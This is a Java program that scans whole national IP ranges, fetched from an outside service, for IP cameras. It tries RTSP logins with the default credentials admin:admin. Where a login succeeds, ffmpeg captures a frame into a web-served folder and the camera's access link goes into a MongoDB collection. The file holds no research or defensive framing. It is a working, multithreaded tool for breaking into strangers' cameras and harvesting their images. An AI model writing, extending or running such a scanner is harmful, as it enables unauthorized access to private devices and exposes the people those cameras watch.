import com.mongodb.MongoClient;
import com.mongodb.client.MongoCollection;
import com.mongodb.client.MongoDatabase;
import com.mongodb.client.model.UpdateOptions;
import com.mongodb.client.result.DeleteResult;
import org.bson.Document;
import java.text.SimpleDateFormat;
import java.util.List;
import java.util.ArrayList;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.Callable;
import java.net.URL;
import java.net.URLConnection;
import java.net.InetAddress;
import java.nio.charset.Charset;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.File;
import java.io.FileReader;
import java.io.FilenameFilter;
import static com.mongodb.client.model.Filters.*;

public class rtsp_sg {

	public static List<String> blackListArray = new ArrayList<String>();

	public static void main(String[] args) {

		// load blacklist
		loadBlackList();

		// connect to the local database server
		MongoClient mongoClient = new MongoClient();

		// get handle to "ipcam" database
		MongoDatabase database = mongoClient.getDatabase("ipcam");

		// get a handle to the "capture_lsit" collection
		MongoCollection<Document> collection = database.getCollection("capture_list_sg");

        	// create thread pool
	        Integer threadSize = 40;
		ExecutorService executor = Executors.newFixedThreadPool(threadSize);

		// create result list
		Future[] futures = new Future[threadSize];

		// token variable
		Date tokenDate;
		SimpleDateFormat tokenFormat;
		String token;

		Boolean running = true;

		while(running) {
		// create token
		tokenDate = new Date();
		tokenFormat = new SimpleDateFormat("yyyyMMddHHmmss");
		token = tokenFormat.format(tokenDate);

	    // Create one directory
	    if ((new File("/var/www/ipcam/pic/sg/" + token)).mkdir()) {
	      System.out.println("Directory: /var/www/ipcam/pic/sg/" + token + " created");
	    }

        // load URL
        try {
	        URL url = new URL("http://services.ce3c.be/ciprg/?countrys=KOREA+REPUBLIC+OF%2C&format=by+input&format2=%7Bstartip%7D%2C%7Bendip%7D%0D%0A");
			URLConnection spoof = url.openConnection();

			// spoof the connection so we look like a web browser
			spoof.setRequestProperty( "User-Agent", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0;    H010818)" );

			BufferedReader in = new BufferedReader(new InputStreamReader(spoof.getInputStream()));

			String strLine = "";
			String startAddr = "";
			String endAddr = "";
			String ip = "";
			String output = "";
			String output_ip = "";
			String output_link = "";
			String output_result = "";
			Long startInt, endInt;
			InetAddress bar, foo;
			boolean busy;

			// loop through every line in the source
			while ((strLine = in.readLine()) != null){

				startAddr = strLine.substring(0,strLine.indexOf(','));
				endAddr = strLine.substring(strLine.indexOf(',')+1);

				int successCount = 0;

				// Convert from an IPv4 address to an integer
				startInt = ipToLong(startAddr);
				endInt = ipToLong(endAddr);

				for(Long l = startInt; l < endInt; l++) {

					// Convert from integer to an IPv4 address
					ip = longToIp(l);

					//System.out.println(ip);

					// Set the busy
					busy = true;

					//Find free thread
					while(busy) {

						for(int i = 1; i < threadSize; i++) {

							if(futures[i] == null) {

								//System.out.println("Free Thread : " + i);

								futures[i] = executor.submit(new rtspTask(ip,token));

								busy = false;

								i = threadSize;

							} else {
								if(futures[i].isDone()) {

									//System.out.println("Done Thread : " + i);

									//Get thread output, link,result
									output = (String)futures[i].get();
									output_ip = output.substring(0,output.indexOf('~'));
									output = output.substring(output.indexOf('~')+1);
									output_link = output.substring(0,output.indexOf('~'));
									output_result = output.substring(output.indexOf('~')+1);

									//Find and update Database
									if(output_result.indexOf("Success") > -1) {
										successCount = successCount + 1;
										System.out.println(output_result);
										Date now = new Date();
										SimpleDateFormat sdFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
										Document doc = new Document("$set", new Document("ip",ipToLong(output_ip))
													.append("link",output_link)
													.append("capture_timestamp",sdFormat.format(now))
													.append("capture_result",output_result)
													.append("token",token));

										try{
											collection.updateOne(eq("ip",ipToLong(output_ip)),doc,new UpdateOptions().upsert(true));
										} catch (Exception e) {
											System.err.println("Caught Exception: " + e.getMessage());
										}
									}


									futures[i] = executor.submit(new rtspTask(ip,token));

									busy = false;

									i = threadSize;

								}

							}

						}

						Thread.sleep(10);

					}

				}

				System.out.println(startAddr + " " + endAddr + " " + String.valueOf(successCount));

			}
        } catch (Exception e) {
        	System.out.println(e.getMessage());
        }

	    // housekeep folder
	    housekeepFolder(token);

	    // housekeep database
		DeleteResult deleteResult = collection.deleteMany(ne("token",token));
		System.out.println("Deleted documents : " + deleteResult.getDeletedCount());

		}
		executor.shutdown();


	}

	public static long ipToLong(String ipAddress) {

		String[] ipAddressInArray = ipAddress.split("\\.");

		long result = 0;
		for (int i = 0; i < ipAddressInArray.length; i++) {

			int power = 3 - i;
			int ip = Integer.parseInt(ipAddressInArray[i]);
			result += ip * Math.pow(256, power);

		}

		return result;
	}

	public static String longToIp(long ip) {

		StringBuilder result = new StringBuilder(15);

		for (int i = 0; i < 4; i++) {

			result.insert(0,Long.toString(ip & 0xff));

			if (i < 3) {
				result.insert(0,'.');
			}

			ip = ip >> 8;
		}

		return result.toString();
	}
	public static void loadBlackList() {

		blackListArray = new ArrayList<String>();

		File file = new File("rtsp_sg.list");

		try {

			BufferedReader br = new BufferedReader(new FileReader(file));

			String line;
			while((line = br.readLine()) != null) {

				String[] line_array = line.split(" ");

				if( line_array[2].equals("0") ) {
					blackListArray.add(line_array[0]);
				}

			}

		} catch(Exception e) {
			System.out.println(e.getMessage());
		}

	}

	public static Boolean inBlackList(String ip) {

		for( String blackList : blackListArray) {

			if( blackList.equals(ip) ) {
				return true;
			}

		}

		return false;

	}
	public static void housekeepFolder(String token) {

		File file = new File("/var/www/ipcam/pic/sg");
		String[] directories = file.list(new FilenameFilter() {
		  @Override
		  public boolean accept(File current, String name) {
		    return new File(current, name).isDirectory();
		  }
		});

		File dir;
		for(int i = 0; i < directories.length; i++) {
			if(!directories[i].equals(token)) {
				dir = new File("/var/www/ipcam/pic/sg/" + directories[i]);
				if (deleteFolder(dir)) {
					System.out.println(directories[i] + " directory is deleted.");
				} else {
					System.out.println(directories[i] + " " + token + " directory delete fail.");
				}
			}
		}

	}

	public static boolean deleteFolder(File dir) {
		if (dir.isDirectory()) {
			String[] children = dir.list();
			for (int i = 0; i < children.length; i++) {
				boolean success = deleteFolder (new File(dir, children[i]));

				if (!success) {
			   		return false;
				}
			}
		}
		return dir.delete();
	}
}

class rtspTask implements Callable<String> {

	private String ip;
	private String token;

	public rtspTask (String ip, String token) {

		this.ip = ip;
		this.token = token;

	}

	@Override
	public String call() throws Exception{

		//System.out.println(Thread.currentThread().getName() + " Begins Work  " + id);
		//Process p;
		//StringBuffer output = new StringBuffer();

		String user, pw, req, link, file, rtspCmd;
		rtspCmd = "";
		user = "admin";
		pw = "admin";
		req = "2";
		file = "/var/www/ipcam/pic/sg/"+token+"/"+ip+".jpeg";

		//ip = "183.179.242.225";
		link = "rtsp://"+user+":"+pw+"@"+ip+"/"+req;
		rtspCmd = "ffmpeg -stimeout 1500000 -i "
			+link+" "
			+"-f image2 -vframes 1 -y "
			+"/var/www/ipcam/pic/sg/"+ip+".jpeg 2>&1";

		//System.out.println(rtspCmd);

		Process processDuration = new ProcessBuilder("ffmpeg","-stimeout","2000000","-rtsp_transport","tcp","-i",link,"-r","1","-vframes","1",file).redirectErrorStream(true).start();
		StringBuilder strBuild = new StringBuilder();
		try (BufferedReader processOutputReader = new BufferedReader(new InputStreamReader(processDuration.getInputStream(), Charset.defaultCharset()));) {
		    String line;
		    while ((line = processOutputReader.readLine()) != null) {
		        strBuild.append(line + System.lineSeparator());
		    }
		    processDuration.waitFor();
		}

		return ip + "~" + link + "~" + checkResult(strBuild.toString());
	}

	public String checkResult(String output) {
		String result = "";
		//System.out.println(output);
		if(output.indexOf("Connection timed out") > -1) {
			result = "Connection timeout";		//Host offline
		} else if(output.indexOf("Connection refused") > -1) {
			result = "Connection refused";		//Host online but no RSTP
		} else if(output.indexOf("400 Bad Request") > -1) {
			result = "400 Bad Request";			//RTSP ok but bad request
		} else if(output.indexOf("401 Unauthorized") > -1) {
			result = "401 Unauthorized";			//RTSP & request ok but incorrect password
		} else if(output.indexOf("Invalid data found") > -1) {
			result = "Invalid data found"; 		//Invalid data found
		} else if(output.indexOf("Output #0, image2, to") > -1) {
			result = "Success"; 					//Connect success
		}
		return result;
	}

}
